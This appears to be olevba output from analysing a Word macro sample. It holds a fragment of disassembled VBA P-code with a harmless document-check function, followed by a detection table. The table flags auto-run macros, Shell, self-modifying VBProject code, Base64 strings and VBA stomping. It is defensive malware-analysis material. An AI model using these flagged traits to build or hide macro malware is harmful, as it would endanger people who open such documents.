' Line #187:
' 	FuncDefn (Sub FileTemplates())
' Line #188:
' 	EndSub 
' Line #189:
' 	FuncDefn (Function Check_For_Doc())
' Line #190:
' 	OnError docek 
' Line #191:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #192:
' 	LitVarSpecial (True)
' 	St DocThere 
' Line #193:
' 	EndIfBlock 
' Line #194:
' 	GoTo over 
' Line #195:
' 	Label docek 
' Line #196:
' 	LitVarSpecial (False)
' 	St DocThere 
' Line #197:
' 	Label over 
' Line #198:
' 	EndFunc 
' Line #199:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

